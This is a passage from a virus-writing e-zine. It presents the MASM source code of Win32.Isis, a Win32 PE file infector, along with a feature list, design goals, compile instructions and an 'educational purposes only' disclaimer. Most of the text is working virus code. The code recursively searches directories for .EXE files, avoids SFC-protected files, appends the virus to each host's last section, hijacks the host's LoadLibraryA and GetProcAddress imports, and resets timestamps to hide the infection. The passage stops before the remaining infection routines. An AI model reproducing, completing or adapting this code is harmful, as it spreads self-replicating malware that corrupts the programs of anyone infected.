 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 -------------------------------- Win32.Isis )=-
 -=( ---------------------------------------------------------------------- )=-

 -=( 0 : Win32.Isis Features ---------------------------------------------- )=-

 Imports:       Copies  LoadLibraryA and  GetProcAddress from   hosts [it  will
                only infect  files that already Import both]
 Infects:       PE  files with   an  .EXE extension   by  expanding the    last
                section, but  without setting the write bit
 Strategy:      With  a  fully   recursive   directory  scanning  engine   that
                doesn't  enter directories more than once per run
 Compatibility: 95/98/ME/NT/2000 Compatible, avoids Win2K SFC'd files
 Saves Stamps:  Yes
 MultiThreaded: No
 Polymorphism:  None
 AntiAV / EPO:  None
 SEH Abilities: None
 Payload:       Displays a MessageBoxA

 -=( 1 : Win32.Isis Design Goals ------------------------------------------ )=-

 : To test an implementation of MASMs type checking on API and PROC calls.
 : To place all virus data into one structure that can be stack hosted, so  the
   write bit does not need to be set in infected sections.
 : To serve as a test virus for a fast, recursive directory scanner, which does
   not visit the same directory twice, and uses only stack data.
 : To use  Imports through  GetProcAddress/LoadLibraryA, which  are stolen   in
   hosts that already import them.

 When it was finished, a friend's pet  rat had died, her name was Isis,  and so
 the virus was named in its memory.  Besides it's a nice virus name too.

 -=( 2 : Win32.Isis Design Faults ----------------------------------------- )=-

 While it did achieve all of the design goals, its structure really needs a lot
 of work,  especially to  clean up  the data  tables.  When  infecting some  PE
 files, headers and  sections can be  incorrectly calculated [rarely],  so that
 would also need  to be modified.   Finally, a lot  of the variables  are badly
 named.

 -=( 3 : Win32.Isis Disclaimer -------------------------------------------- )=-

 THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
 COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
 BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
 YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.

 COPYRIGHT
 Copyright on  materials in  this  magazine  and  the  information  therein and
 their  arrangement is owned by FEATHERED SERPENTS  unless otherwise indicated.

 RIGHTS AND LIMITATIONS
 You have  the  right  to use,    copy and  distribute  the  material in   this
 magazine free   of  charge,  for  all   purposes  allowed  by your   governing
 laws.  You    are expressly  PROHIBITED   from   using the  material contained
 herein  for   any   purposes  that   would   cause    or would    help promote
 the illegal   use of the material.

 NO WARRANTY
 The  information   contained within   this  magazine  are  provided  "as  is".
 FEATHERED    SERPENTS     do    not    warranty    the     accuracy, adequacy,
 or   completeness     of     given  information,  and    expressly   disclaims
 liability   for   errors   or   omissions    contained  therein.   No implied,
 express, or statutory  warranty, is given  in conjunction with  this magazine.

 LIMITATION OF LIABILITY
 In *NO* event will FEATHERED SERPENTS or any of its MEMBERS be liable for  any
 damages  including  and  without  limitation,  direct  or  indirect,  special,
 incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
 connection with this magazine, or the use thereof.

 ADDITIONAL DISCLAIMER
 Computer viruses will spread of their own accord between computer systems, and
 across international boundaries.  They are raw animals with no concern for the
 law, and for that reason your possession of them makes YOU responsible for the
 actions they carry out.

 The viruses provided in this magazine are for educational purposes ONLY.  They
 are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
 conditions.  If compiled and executed these viruses WILL land you in court(s).

 You will be held responsible for your actions.  As  source code these  viruses
 are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
 countries.  In  binary form  these viruses  are malicious  weapons.  FEATHERED
 SERPENTS do not condone the application of these viruses and will NOT be  held
 LIABLE for any MISUSE.

 -=( 4 : Win32.Isis Compile Instructions ---------------------------------- )=-

 MASM 6.15 and LINK 6.00.8447
 ml /c /Cp /coff /Fl /Zi Isis.asm
 link /debug /debugtype:cv /subsystem:windows Isis.obj

 -=( 5 : Win32.Isis ------------------------------------------------------- ) `

.386p                                   ; 386 opcodes
.model     flat,stdcall                 ; Written for flat Win32
option     casemap:none                 ; Use mixed case symbols
include    masmwinc.inc                 ; Win32 constant symbols
includelib c:\masm32\lib\kernel32.lib   ; First-run imported API

ExitProcess             PROTO :DWORD
LoadLibraryA            PROTO :DWORD
GetProcAddress          PROTO :DWORD, :DWORD

Host        SEGMENT 'CODE'
    push    0
    call    ExitProcess
    call    LoadLibraryA
    call    GetProcAddress
Host        ENDS

; =============================================================================
; ( Virus Constants, Protos, and Macros ) =====================================
; =============================================================================

FRUN_HOSTSRVA           EQU 3000H
FRUN_VIRUSRVA           EQU 5000H
FRUN_LOADLIBRARYA       EQU 9060H
FRUN_GETPROCADDRESS     EQU 9064H
GAME_OVER_MAX           EQU 6
AVOIDED_FILES           EQU FILE_ATTRIBUTE_DEVICE       OR FILE_ATTRIBUTE_TEMPORARY     OR \
                            FILE_ATTRIBUTE_SPARSE_FILE  OR FILE_ATTRIBUTE_REPARSE_POINT OR \
                            FILE_ATTRIBUTE_OFFLINE      OR FILE_ATTRIBUTE_COMPRESSED    OR \
                            FILE_ATTRIBUTE_ENCRYPTED


    DO_API              MACRO   PARAM:VARARG
                        PUSHAD
                        INVOKE  PARAM
                        MOV [ESP+1CH], EAX
                        POPAD
    ENDM                DO_API

    CompareStringM      MACRO   STRING1:REQ,    STRING2:REQ
                        DO_API  tCompareStringA PTR [esi + VX.pCompareStringA],         \
                                LOCALE_SYSTEM_DEFAULT, NORM_IGNORECASE, STRING1, -1,    \
                                STRING2, -1
    ENDM                CompareStringM

    CreateFileM         MACRO   FILENAME:REQ
                        DO_API  tCreateFileA PTR [esi + VX.pCreateFileA], FILENAME,     \
                                GENERIC_READ OR GENERIC_WRITE, 0, 0, OPEN_EXISTING,     \
                                0, 0
    ENDM                CreateFileM

    CreateFileMappingM  MACRO   HANDLE:REQ,     SIZE:REQ
                        DO_API  tCreateFileMappingA PTR [esi + VX.pCreateFileMappingA], \
                                HANDLE, 0, PAGE_READWRITE, 0, SIZE, 0
    ENDM                CreateFileMappingM

    ListEntry           MACRO   POINTER: REQ,   STRING:REQ,     TYPE:VARARG
                        p&POINTER   DD 0
                        s&POINTER   DB STRING,  0
                        TYPE
    ENDM                ListEntry

    MapViewOfFileM      MACRO   HANDLE:REQ
                        DO_API  tMapViewOfFile PTR [esi + VX.pMapViewOfFile], HANDLE,   \
                                FILE_MAP_ALL_ACCESS, NULL, NULL, NULL
    ENDM                MapViewOfFileM

    VirusEntry  PROTO
    Recurse     PROTO   VD:PTR VX,  RL:PTR RX
    AccessFile  PROTO   VD:PTR VX,  RD:PTR RX

    PrepareFile PROTO   VD:PTR VX,  RD:PTR RX,  MAP:DWORD
    ImportScan  PROTO   VD:PTR VX,              MAP:DWORD,    TABLE:DWORD
    FinishFile  PROTO   VD:PTR VX,  RD:PTR RX,  MAP:DWORD

    AlignToVA   PROTO                                         VALUE:DWORD,  ALIGNER:DWORD
    ConvertToVA PROTO                           MAP:DWORD,    VALUE:DWORD

    ___SfcIsFileProtected   PROTO   A:DWORD, B:DWORD
    ___CheckSumMappedFile   PROTO   A:DWORD, B:DWORD, Y:DWORD, Z:DWORD

; =============================================================================
; ( Virus Structures ) ========================================================
; =============================================================================

VX          STRUCT      DWORD
    VirusEntryPoint     DD       FRUN_VIRUSRVA
    HostsEntryPoint     DD       FRUN_HOSTSRVA
    LoadLibraryRVA      DD   FRUN_LOADLIBRARYA
    GetProcAddressRVA   DD FRUN_GETPROCADDRESS

    DeltaOffset         DD 0
    GameOverMan         DD 0
    FindSpecification   DB '*',    0
    ExecSpecification   DB '.EXE', 0

    SectionEntry        DD 0
    NewFileSize         DD 0
    NewSectionSize      DD 0

    ImportList          DD VX.pCloseHandle,             VX.ImportKernel32,      NULL
                        DD VX.pCompareStringA,          VX.ImportKernel32,      NULL
                        DD VX.pCreateFileA,             VX.ImportKernel32,      NULL
                        DD VX.pCreateFileMappingA,      VX.ImportKernel32,      NULL
                        DD VX.pFindClose,               VX.ImportKernel32,      NULL
                        DD VX.pFindFirstFileA,          VX.ImportKernel32,      NULL
                        DD VX.pFindNextFileA,           VX.ImportKernel32,      NULL
                        DD VX.pGetCurrentDirectoryA,    VX.ImportKernel32,      NULL
                        DD VX.pGetFileAttributesA,      VX.ImportKernel32,      NULL
                        DD VX.pGetLocalTime,            VX.ImportKernel32,      NULL
                        DD VX.pMapViewOfFile,           VX.ImportKernel32,      NULL
                        DD VX.pSetCurrentDirectoryA,    VX.ImportKernel32,      NULL
                        DD VX.pSetFileAttributesA,      VX.ImportKernel32,      NULL
                        DD VX.pSetFileTime,             VX.ImportKernel32,      NULL
                        DD VX.pUnmapViewOfFile,         VX.ImportKernel32,      NULL
                        DD VX.pMessageBoxA,             VX.ImportUser32,        NULL
                        DD VX.pCheckSumMappedFile,      VX.ImportImageHlp,      AlternSum - WinMain
                        DD VX.pSfcIsFileProtected,      VX.ImportSfc,           AlternSfc - WinMain
                        DD NULL

    ImportKernel32      DB 'KERNEL32.DLL',              0
    ListEntry           CloseHandle,                    'CloseHandle',          tCloseHandle           TYPEDEF PROTO :DWORD
    ListEntry           CompareStringA,                 'CompareStringA',       tCompareStringA        TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
    ListEntry           CreateFileA,                    'CreateFileA',          tCreateFileA           TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
    ListEntry           CreateFileMappingA,             'CreateFileMappingA',   tCreateFileMappingA    TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
    ListEntry           FindClose,                      'FindClose',            tFindClose             TYPEDEF PROTO :DWORD
    ListEntry           FindFirstFileA,                 'FindFirstFileA',       tFindFirstFileA        TYPEDEF PROTO :DWORD,:DWORD
    ListEntry           FindNextFileA,                  'FindNextFileA',        tFindNextFileA         TYPEDEF PROTO :DWORD,:DWORD
    ListEntry           GetCurrentDirectoryA,           'GetCurrentDirectoryA', tGetCurrentDirectoryA  TYPEDEF PROTO :DWORD,:DWORD
    ListEntry           GetFileAttributesA,             'GetFileAttributesA',   tGetFileAttributesA    TYPEDEF PROTO :DWORD
    ListEntry           GetProcAddress,                 'GetProcAddress',       tGetProcAddress        TYPEDEF PROTO :DWORD,:DWORD
    ListEntry           GetLocalTime,                   'GetLocalTime',         tGetLocalTime          TYPEDEF PROTO :DWORD
    ListEntry           LoadLibraryA,                   'LoadLibraryA',         tLoadLibraryA          TYPEDEF PROTO :DWORD
    ListEntry           MapViewOfFile,                  'MapViewOfFile',        tMapViewOfFile         TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
    ListEntry           SetCurrentDirectoryA,           'SetCurrentDirectoryA', tSetCurrentDirectoryA  TYPEDEF PROTO :DWORD
    ListEntry           SetFileAttributesA,             'SetFileAttributesA',   tSetFileAttributesA    TYPEDEF PROTO :DWORD,:DWORD
    ListEntry           SetFileTime,                    'SetFileTime',          tSetFileTime           TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD
    ListEntry           UnmapViewOfFile,                'UnmapViewOfFile',      tUnmapViewOfFile       TYPEDEF PROTO :DWORD
    ImportUser32        DB 'USER32.DLL',                0
    ListEntry           MessageBoxA,                    'MessageBoxA',          tMessageBoxA           TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD
    ImportImageHlp      DB 'IMAGEHLP.DLL',              0
    ListEntry           CheckSumMappedFile,             'CheckSumMappedFile',   tCheckSumMappedFile    TYPEDEF PROTO :DWORD,:DWORD,:DWORD,:DWORD
    ImportSfc           DB 'SFC.DLL',                   0
    ListEntry           SfcIsFileProtected,             'SfcIsFileProtected',   tSfcIsFileProtected    TYPEDEF PROTO :DWORD,:DWORD

    VirusTitle          DB 'Your Computer Flows With The Spyryt Of Win32.Isis', 0                                   ; Your Computer Flows With The Spyryt Of Win32.Isis
    VirusMessage        DB 'Dedicated to our Isis and Horus: Maman vous aime!', 13, 10                              ; Dedicated to our Isis and Horus: Maman vous aime!
                        DB 13, 10                                                                                   ;
                        DB 'Create',    9, 'PROTO Mother:PTR Rat, Father:PTR Rat',                      13, 10      ; Create        PROTO Mother:PTR Rat, Father:PTR Rat
                        DB              9, '...',                                                       13, 10      ;               ...
                        DB 'Rat',       9, 'STRUCT',                                                    13, 10      ; Rat           STRUCT
                        DB              9, 'Colour',            9, 'DB 10 DUP (?)',                     13, 10      ;               Colour      DB 10 DUP (?)
                        DB              9, 'Length',            9, 'DD ?',                              13, 10      ;               Length      DD ?
                        DB 'Rat',       9, 'ENDS',                                                      13, 10      ; Rat           ENDS
                        DB              9, '...',                                                       13, 10      ;               ...
                        DB 'Isis',      9, 'Rat {''Drk', 9, 'Blonde'', 9}', 9, '; Mother',              13, 10      ; Isis          Rat         {'Drk Blonde', 9}   ; Mother
                        DB 'Horus',     9, 'Rat {''Ash', 9, 'Blonde'', 7}', 9, '; Father',              13, 10      ; Horus         Rat         {'Ash Blonde', 7}   ; Father
                        DB              9, '...',                                                       13, 10      ;               ...
                        DB              9, 'INVOKE Create, ADDR Isis, ADDR Horus',                      13, 10      ;               INVOKE      Create, ADDR Isis, ADDR Horus
                        DB              9, '...',                                                       13, 10      ;               ...
                        DB 'Create',    9, 'PROC',              9, 'USES', 9, 'EBX ECX EDX ESI EDI,',   13, 10      ; Create        PROC        USES    EBX ECX EDX ESI EDI
                        DB              9,                      9, 9, 'Mother:PTR Rat, Father:PTR Rat', 13, 10      ;                                   Mother:PTR Rat, Father:PTR Rat
                        DB              9,                      9, 'LOCAL', 9, 'Daughter:Rat',          13, 10      ;                           LOCAL   Daughter:Rat
                        DB                                                                              13, 10      ;
                        DB              9, 'mov esi,',          9, '[Mother',           9, ']',         13, 10      ;               mov esi, [Mother]
                        DB              9, 'mov esi,',          9, '[esi',              9, ']',         13, 10      ;               mov esi, [esi]
                        DB              9, 'mov ebx,',          9, '[esi + Rat.Length', 9, ']',         13, 10      ;               mov ebx, [esi + Rat.Length]
                        DB              9, 'mov edi,',          9, '[Father',           9, ']',         13, 10      ;               mov edi, [Father]
                        DB              9, 'mov edi,',          9, '[edi',              9, ']',         13, 10      ;               mov edi, [edi]
                        DB              9, 'add ebx,',          9, '[edi + Rat.Length', 9, ']',         13, 10      ;               add ebx, [edi + Rat.Length]
                        DB              9, 'shr ebx,',          9,                      9, '1',         13, 10      ;               shr ebx,        1
                        DB              9, 'mov [Daughter.Length],',   9, 'ebx',                        13, 10      ;               mov [Daughter.Length], ebx
                        DB              9, '...',                                                       13, 10      ;               ...
                        DB                                                                              13, 10, 0   ;
                        ALIGN            4
VX          ENDS

RX          STRUCT      DWORD
    FindData            WIN32_FIND_DATA {?}
    FindHandle          DD               ?
    NewDirectory        DD MAX_PATH DUP (?)
    CurrentDirectory    DD MAX_PATH DUP (?)
    LastRecurse         DD               ?
                        ALIGN            4
RX          ENDS

; =============================================================================
; ( Virus EntryPoint ) ========================================================
; =============================================================================

Virus       SEGMENT 'CODE'
WinMain:
    push    NULL                    ; Updated to become HostsEntryPoint later

VirusEntry  PROC
            LOCAL   VD:VX

    ; Save the registers for our host, calculate WinMain VA and Delta Offset
    pusha
    pushfd
    call    @F
@@: pop     esi
    sub     esi, 12h ; @B - WinMain
    mov     eax, esi
    sub     esi, offset     WinMain
    push    esi

    ; Copy our data section into the allocated stack area.  Must be / DWORD.
    lea     esi, [esi][Virus_Data]
    lea     edi,              [VD]
    mov     ecx,       Size VD / 4
    cld
    rep     movsd
    pop     [VD.DeltaOffset      ]

    ; ImageBase = WinMain VA - WinMain RVA.  Convert critical API RVA to VA.
    sub     eax, [VD.VirusEntryPoint  ]

    push    eax
    add     eax, [VD.LoadLibraryRVA   ]
    mov     eax, [eax]
    mov     [VD.pLoadLibraryA],     eax
    pop     eax

    push    eax
    add     eax, [VD.GetProcAddressRVA]
    mov     eax, [eax]
    mov     [VD.pGetProcAddress],   eax
    pop     eax

    ; Overwrite the NULL we stored on the stack with our Hosts EntryPoint VA
    add     eax, [VD.HostsEntryPoint  ]
    mov     [ebp + DWORD],          eax

    ; Parse our ImportList.  Formatted as: API RVA, DLL RVA, ALTERNATE RVA.
    lea     esi, [VD.ImportList]
@@: lodsd                               ; RVA of API DWORD
    or      eax, eax                    ; NULL if List End
    jz      @F                          ; Stop if it's the end of this List
    lea     edi, [eax][VD]              ; EDI = Where to write final API VA
    lea     ebx, [eax][VD][4]           ; API Name String follows API DWORD
    lodsd                               ; DLL Name String RVA

    DO_API  tLoadLibraryA   PTR [VD.pLoadLibraryA  ], ADDR [VD][eax]
    DO_API  tGetProcAddress PTR [VD.pGetProcAddress],    eax,    ebx

    stosd                               ; Save VA into API VA
    or      eax, eax                    ; Check if successful
    lodsd                               ; Alternate Entry RVA
    jnz     @B                          ; Loop back if all OK

    or      eax, eax                    ; Check if Alternate doesn't exist
    jz      WinExit                     ; Abort, because we need something
    add     eax, offset   WinMain
    add     eax, [VD.DeltaOffset]
    mov     [edi][-4],        eax
    jmp     @B                          ; Save Alternates VA and loop back

@@: ; Initialize counter, recurse through directories for infectable files
    mov     [VD.GameOverMan],   NULL
    DO_API  Recurse, ADDR [VD], NULL

    ; Check if the date is 21st of November which is when Isis passed away
    DO_API  tGetLocalTime PTR [VD.pGetLocalTime], ADDR [VD]
    cmp     WORD PTR [VD][2], 11
    jne     WinExit
    cmp     WORD PTR [VD][6], 20
    jne     WinExit

    DO_API  tMessageBoxA PTR [VD.pMessageBoxA], NULL, ADDR [VD.VirusMessage], ADDR [VD.VirusTitle], NULL

WinExit:
    popfd
    popa
    ret
VirusEntry  ENDP

; =============================================================================
; ( Directory/File Recursion ) ================================================
; =============================================================================
Recurse     PROC    VD:Ptr VX,          RL:Ptr RX
            LOCAL   RD:RX

    ; Search for the first entry in our current directory
    mov     esi,             [VD]
    mov     eax,             [RL]
    mov     [RD.LastRecurse], eax

    DO_API  tFindFirstFileA PTR [esi][VX.pFindFirstFileA], ADDR [esi][VX.FindSpecification], ADDR [RD.FindData]
    mov     [RD.FindHandle],      eax
    cmp     eax, INVALID_HANDLE_VALUE
    je      RecurseExit

RecurseOkay:
    ; Don't touch files or directories with these strange attributes set
    test    dword ptr [RD.FindData.FileAttributes],            AVOIDED_FILES
    jnz     RecurseNext
    ; Split between file / directory routines
    test    dword ptr [RD.FindData.FileAttributes], FILE_ATTRIBUTE_DIRECTORY
    jnz     RecurseDirs

    ; Locate end of file name
    lea     edi, [RD.FindData.FileName     ]
    xor     eax, eax
    mov     ecx,                    MAX_PATH
    repnz   scasb
    jnz     RecurseNext
    sub     edi, 5

    ; Compare extension with .EXE
    lea     eax, [esi][VX.ExecSpecification]
    CompareStringM                  eax, edi
    cmp     eax, 2
    jne     RecurseNext

    ; Check if it's under SFC protection or if it's too big for us to handle
    DO_API  tSfcIsFileProtected PTR [esi][VX.pSfcIsFileProtected], NULL, ADDR [RD.FindData.FileName]
    or      eax, eax
    jnz     @F

    cmp     [RD.FindData.FileSizeHigh], 0
    jne     @F

    DO_API  AccessFile,  [VD],  ADDR [RD]
@@: jmp     RecurseNext

RecurseDirs:
    ; Don't recurse if we've recursed enough.  Save the current directory and
    ; change to the new one and save its full directory name as well.
    cmp     [esi][VX.GameOverMan], GAME_OVER_MAX
    je      RecurseNext

    DO_API  tGetCurrentDirectoryA PTR [esi][VX.pGetCurrentDirectoryA], MAX_PATH, ADDR [RD.CurrentDirectory ]
    cmp     eax, NULL
    je      RecurseNext

    DO_API  tSetCurrentDirectoryA PTR [esi][VX.pSetCurrentDirectoryA],           ADDR [RD.FindData.FileName]
    cmp     eax, NULL
    je      RecurseNext

    DO_API  tGetCurrentDirectoryA PTR [esi][VX.pGetCurrentDirectoryA], MAX_PATH, ADDR [RD.NewDirectory     ]
    cmp     eax, NULL
    je      RecurseNext

    ; Loop through each Recurse stack comparing New to Currents
    lea     ebx, [RD.NewDirectory         ]
    lea     edi, [RD]
@@: lea     ecx, [edi][RX.CurrentDirectory]
    CompareStringM            ecx, ebx
    cmp     eax, 2
    je      RecurseMatch
    mov     edi, [edi][RX.LastRecurse]
    or      edi, edi
    jnz     @B

    inc     [esi][VX.GameOverMan     ]
    DO_API  Recurse, [VD],   ADDR [RD]
    dec     [esi][VX.GameOverMan     ]

RecurseMatch:
    DO_API  tSetCurrentDirectoryA PTR [esi][VX.pSetCurrentDirectoryA], ADDR [RD.CurrentDirectory]

RecurseNext:
    ; Abort if we've recursed and infected enough
    cmp     [esi][VX.GameOverMan],  GAME_OVER_MAX
    je      RecurseCleanup

    ; Continue the search for files / directories
    DO_API  tFindNextFileA PTR [esi][VX.pFindNextFileA], [RD.FindHandle], ADDR [RD.FindData     ]
    or      eax, eax
    jne     RecurseOkay

RecurseCleanup:
    ; Close our search handle and exit
    DO_API  tFindClose PTR [esi][VX.pFindClose], [RD.FindHandle]

RecurseExit:
    ret
Recurse     ENDP

; =============================================================================
; ( File Access Moderator ) ===================================================
; =============================================================================
AccessFile  PROC    VD:PTR VX,          RD:PTR RX

    ; Remove attributes only if necessary
    mov     esi, [VD]
    mov     edi, [RD]
    test    [esi][RX.FindData.FileAttributes], FILE_ATTRIBUTE_READONLY OR FILE_ATTRIBUTE_SYSTEM
    jz      @F
    DO_API  tSetFileAttributesA PTR [esi][VX.pSetFileAttributesA], ADDR [edi][RX.FindData.FileName], FILE_ATTRIBUTE_NORMAL
    or      eax, eax
    jz      AccessExit

@@: ; Open the file fully, saving each handle on the stack as we go
    CreateFileM ADDR [edi][RX.FindData.FileName]
    cmp     eax,            INVALID_HANDLE_VALUE
    je      AccessAttributes
    push    eax
    push    eax

    CreateFileMappingM  eax, 0
    or      eax, eax
    jz      AccessCloseFile
    push    eax

    MapViewOfFileM                eax
    cmp     eax, INVALID_HANDLE_VALUE
    jz      AccessCloseMap
    push    eax

    ; Prepare the file for infection by making sure headers are correct,
    ; working out how much space we will add to the file sections, etc
    DO_API  PrepareFile, [VD], [RD], eax
    or      eax, eax
    jz      AccessCloseView

    ; Close the file and reopen it bigger to fit the virus inside
    pop     eax
    DO_API  tUnmapViewOfFile PTR [esi][VX.pUnmapViewOfFile], eax
    pop     eax
    DO_API  tCloseHandle     PTR [esi][VX.pCloseHandle],     eax

    pop     eax
    push    eax
    CreateFileMappingM                eax, [esi][VX.NewFileSize]
    or      eax, eax
    jz      AccessCloseFile
    push    eax

    MapViewOfFileM                  eax
    cmp     eax,   INVALID_HANDLE_VALUE
    jz      AccessCloseMap
    push    eax

    ; Finish up infecting the file and increment infection counter
    DO_API  FinishFile, [VD], [RD], eax
    or      eax, eax
    jz      AccessCloseView
    inc     [esi][VX.GameOverMan      ]

AccessCloseView:
    pop     eax
    DO_API  tUnmapViewOfFile PTR [esi][VX.pUnmapViewOfFile], eax

AccessCloseMap:
    pop     eax
    DO_API  tCloseHandle     PTR [esi][VX.pCloseHandle],     eax

AccessCloseFile:
    ; Reset file stamps so that we don't look too suspicious
    pop     ebx
    DO_API  tSetFileTime PTR [esi][VX.pSetFileTime], ebx, ADDR [edi][RX.FindData.LastWriteTime], ADDR [edi][RX.FindData.LastAccessTime], ADDR [edi][RX.FindData.CreationTime]
    pop     eax
    DO_API  tCloseHandle PTR [esi][VX.pCloseHandle], eax

AccessAttributes:
    ; Restore attributes only if they were changed
    test    [esi][RX.FindData.FileAttributes], FILE_ATTRIBUTE_READONLY OR \
                                               FILE_ATTRIBUTE_SYSTEM
    jz      AccessExit
    DO_API  tSetFileAttributesA PTR [esi][VX.pSetFileAttributesA], ADDR [edi][RX.FindData.FileName], [edi][RX.FindData.FileAttributes]

AccessExit:
    ret
AccessFile  ENDP

; =============================================================================
; ( Infection Preparation ) ===================================================
; =============================================================================
PrepareFile PROC    VD:PTR VX, RD:PTR RX, MAP:DWORD

    ; Is the file already infected?
    mov     esi, [VD ]
    mov     edi, [MAP]
    cmp     [edi][IMAGE_DOS_HEADER.e_csum],    -1
    je      PrepareFail
    cmp     [edi][IMAGE_DOS_HEADER.e_magic],              IMAGE_DOS_SIGNATURE
    jne     PrepareFail

    ; Are the standard COFF headers okay?
    add     edi, [edi][IMAGE_DOS_HEADER.e_lfanew]
    cmp     [edi][PE.Signature],                           IMAGE_NT_SIGNATURE
    jne     PrepareFail
    cmp     [edi][PE.Machine],                        IMAGE_FILE_MACHINE_I386
    jne     PrepareFail
    cmp     [edi][PE.SizeOfOptionalHeader], IMAGE_SIZEOF_NT_OPTIONAL32_HEADER
    jne     PrepareFail
    cmp     [edi][PE.Magic],                    IMAGE_NT_OPTIONAL_HDR32_MAGIC
    jne     PrepareFail
    cmp     [edi][PE.SizeOfHeaders],            0
    je      PrepareFail

    ; Do some checks on the Import Table
    cmp     [edi][PE.NumberOfRvaAndSizes],      2
    jb      PrepareFail
    cmp     [edi][PE.DataDirectory.Import.Sizes],                0
    je      PrepareFail

    DO_API  ConvertToVA, [MAP], [edi][PE.DataDirectory.Import.RVA]
    mov     edx, eax
    or      edx, edx
    jz      PrepareFail

    ; Loop through each IMPORT Entry looking for a 'Kernel32.DLL' Name.  For
    ; each found we ImportScan for our LoadLibraryA and GetProcAddress.  We
    ; can get both from the one IMPORT Entry, or if only one is found, then
    ; we continue scanning incase there are multiple 'Kernel32.DLL', IMPORT
    ; entries with procedures split across them.
    mov     ecx, [edi][PE.DataDirectory.Import.Sizes]
    mov     [esi][VX.LoadLibraryRVA],    0
    mov     [esi][VX.GetProcAddressRVA], 0
@@: DO_API  ConvertToVA, [MAP], [edx][IMPORT.Names  ]
    or      eax, eax
    jz      PrepareFail
    lea     ebx, [esi][VX.ImportKernel32]
    CompareStringM               eax, ebx
    cmp     eax, 2
    jne     PrepareNext
    DO_API  ImportScan,  [VD], [MAP], edx
    or      eax, eax
    jnz     @F

PrepareNext:
    add     edx, SIZE IMPORT
    sub     ecx, SIZE IMPORT
    jz      PrepareFail
    cmp     ecx, [edi][PE.DataDirectory.Import.Sizes]
    jae     PrepareFail
    jmp     @B

@@: ; Scan through the SECTION Table and find the last 'Physical' SECTION.  We
    ; save its RVA because its VA won't be valid when FinalFile needs it.
    movzx   ecx, [edi][PE.NumberOfSections     ]
    add      di, [edi][PE.SizeOfOptionalHeader ]
    adc     edi, PE.Magic
    xor     eax, eax

PrepareSection:
    ; Also check there are no 'bad' entries
    cmp     [edi][SECTION.VirtualSize],        0
    je      PrepareFail
    cmp     [edi][SECTION.SizeOfRawData],      0
    je      PrepareFail
    cmp     [edi][SECTION.PointerToRawData], eax
    jb      @F
    mov     eax, [edi][SECTION.PointerToRawData]
    mov     edx, edi
@@: add     edi, SIZE SECTION
    loop    PrepareSection

    mov     edi, edx
    sub     edx, [MAP]
    mov     [esi][VX.SectionEntry], edx

    ; Calculate how big the SECTION will be to completely engulf the rest of
    ; the file [including DEBUG information] and save as VirusEntryPoint
    mov     edx, [RD]
    mov     eax, [edx][RX.FindData.FileSizeLow ]
    sub     eax, [edi][SECTION.PointerToRawData]
    push    eax
    add     eax, [edi][SECTION.VirtualAddress  ]
    mov     [esi][VX.VirusEntryPoint],       eax
    pop     eax

    ; Calculate the SECTION + Slack + Virus + Padding Size
    mov     edx, [MAP]
    add     edx, [edx][IMAGE_DOS_HEADER.e_lfanew  ]
    add     eax, Virus_Size
    DO_API  AlignToVA, eax, [edx][PE.FileAlignment]
    mov     [esi + VX.NewSectionSize],          eax

    add     eax, [edi][SECTION.PointerToRawData   ]
    jc      PrepareFail
    mov     [esi][VX.NewFileSize],              eax
    mov     eax, -1
    jmp     PrepareExit

PrepareFail:
    xor     eax, eax
PrepareExit:
    ret
PrepareFile ENDP

; =============================================================================
; ( Infection Import Scanner ) ================================================
; =============================================================================

ImportScan  PROC    VD:PTR VX, MAP:DWORD, TABLE:DWORD

    ; Locate the correct Thunk List which is swapped between MASM and TASM
    mov     esi, [VD]
    mov     edi, [TABLE]

    mov     eax, [edi][IMPORT.OriginalFirstThunk]
    or      eax, eax
    jnz     @F
    mov     eax, [edi][IMPORT.FirstThunk        ]

@@: DO_API  ConvertToVA,               [MAP], eax
    or      eax, eax
    jz      ImportExit
    mov     edi, eax
    xor     ecx, ecx

    ; Check if entry is the last in the table.  If not, skip it if it's an
    ; Ordinal entry, or load up where it points to and skip the Hint.
ImportLoop:
    mov     eax,   [edi]
    or      eax, eax
    jz      ImportFinish
    js      ImportNext
    DO_API  ConvertToVA, [MAP], eax
    or      eax, eax
    jz      ImportFail
    inc     eax
    inc     eax

    ; Compare the string to our GetProcAddress string.  If it matches, we
    ; move onto the 'save' section which is pointed to by EDX.  We saved
    ; EAX for our next compare.
    push    eax
    lea     edx,   [esi][VX.GetProcAddressRVA          ]
    CompareStringM ADDR [esi][VX.sGetProcAddress  ], eax
    cmp     eax, 2
    pop     eax
    je      @F

    ; Compare the string to our LoadLibraryA string.  If it matches, we
    ; move onto the 'save' section which is pointed to by EDX.  We didn't
    ; save EAX, it's not needed anymore.
    lea     edx,   [esi][VX.LoadLibraryRVA             ]
    CompareStringM ADDR [esi][VX.sLoadLibraryA ],    eax
    cmp     eax, 2
    jne     ImportNext

@@: ; FirstThunk is the one that will be overwritten with the VAs of API on
    ; execution, wether linked with MASM or TASM.  Save its RVA for later.
    mov     ebx, [TABLE                 ]
    mov     ebx, [ebx][IMPORT.FirstThunk]
    lea     ebx, [ebx + ecx * 4         ]
    mov     [edx],                    ebx

ImportNext:
    inc     ecx
    add     edi,     4
    jmp     ImportLoop

ImportFinish:
    ; Failed by default, meaning continue searching for more Kernel32.DLL
    ; Imports.  If both API have been filled in, the loop routine that has
    ; called us can stop searching.
    mov     eax,                        -1
    cmp     [esi][VX.LoadLibraryRVA],    0
    je      ImportFail
    cmp     [esi][VX.GetProcAddressRVA], 0
    jne     ImportExit

ImportFail:
    xor     eax, eax
ImportExit:
    ret
ImportScan  ENDP

; =============================================================================
